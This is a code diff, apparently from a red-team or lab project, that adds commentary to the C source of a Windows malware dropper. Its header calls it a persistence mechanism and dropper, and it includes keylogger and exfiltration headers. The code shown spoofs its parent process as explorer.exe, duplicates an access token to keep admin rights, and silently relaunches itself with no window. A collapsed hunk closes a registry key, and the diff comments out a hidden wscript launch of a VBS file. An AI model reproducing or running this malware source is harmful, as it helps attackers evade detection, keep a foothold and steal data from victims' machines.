@@ -1,3 +1,7 @@
+/*
+Persistence mechanism and dropper
+author: Bryant Chang
+*/
 #include <winsock2.h>
 #include "libs/winexfil.h"
 #include "libs/winkeylog.h"
@@ -9,19 +13,29 @@
 #include "winconsts.h"
 
 int isInRegistry() {
+    // Checks if the current file is in the %TEMP% folder or not.
     char szPath[MAX_PATH];
     GetModuleFileNameA(NULL, szPath, MAX_PATH);
     return (strstr(szPath, "TEMP") != NULL || strstr(szPath, PROC_NAME) != NULL);
 }
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    /*
+    Main malware dropper functionality
+    */
     DBG("MAIN is being executed!");
     if (!strstr(lpCmdLine, "-d")) {
+        // Parent process spoofing explorer.exe!!!
         DBG("No deploy, so spawning elevated child process under explorer...");
         HWND hShell = GetShellWindow();
         DWORD targetPid = 0;
+        // lol explorer.exe is pretty much shell
         GetWindowThreadProcessId(hShell, &targetPid);
         if (targetPid == 0) return 0;
+        // Openprocess gets explorer.exe process
         HANDLE hExplorer = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
+        // child process will not have admin perms once spawned in explorer.exe
+        // make sure to retain the admin perms so it can write to registry
+        // this is done with an access token granting admin perms
         HANDLE hToken = NULL;
         HANDLE hNewToken = NULL;
         if (OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken)) {
@@ -29,16 +43,24 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 PROCESS_INFORMATION pi = {0};
                 STARTUPINFOEXA si = {0};
                 SIZE_T size = 0;
+                // gets the memory size needed to store 1 attribute
                 InitializeProcThreadAttributeList(NULL, 1, 0, &size);
+                // allocate memory for spoofing into a buffer
                 si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
+                // now that we have a buffer, windows can turn it into an attribute!
                 InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
+                // hi windows, i want my parent to be explorer.exe
                 UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorer, sizeof(HANDLE), NULL, NULL);
+                // report the new size
                 si.StartupInfo.cb = sizeof(si);
+                // prepare the command...
                 char szPath[MAX_PATH];
                 GetModuleFileNameA(NULL, szPath, MAX_PATH);
-                char payloadCmd[MAX_PATH + 20];
-                snprintf(payloadCmd, sizeof(payloadCmd), "\"%s\" -d", szPath);
-                if (CreateProcessAsUserA(hNewToken, NULL, (char*)payloadCmd, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
+                char cmd[MAX_PATH + 20];
+                snprintf(cmd, sizeof(cmd), "\"%s\" -d", szPath);
+                // use createProcessAsUserA instead of CreateProcessA
+                // that way we can use the access token
+                if (CreateProcessAsUserA(hNewToken, NULL, (char*)cmd, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, NULL, NULL, &si.StartupInfo, &pi)) {
                     DBG("Elevated child spawned under Explorer.");
                     CloseHandle(pi.hProcess);
                     CloseHandle(pi.hThread);
@@ -99,10 +121,11 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
         RegCloseKey(hKey);
     }
-    // dont run these while in ansible
-    char vbscmd[MAX_PATH + 30];
-    snprintf(vbscmd, sizeof(vbscmd), "wscript.exe //B \"%s\"", VBS_PATH);
-    WinExec(vbscmd, 0);
+    // dont run these if prebaked using ansible.
+    // This is if you are manually running the exe file.
+    //char vbscmd[MAX_PATH + 30];
+    //snprintf(vbscmd, sizeof(vbscmd), "wscript.exe //B \"%s\"", VBS_PATH);
+    //WinExec(vbscmd, 0);
     DBG("I ran the VBS file...");
     return 0;
 }
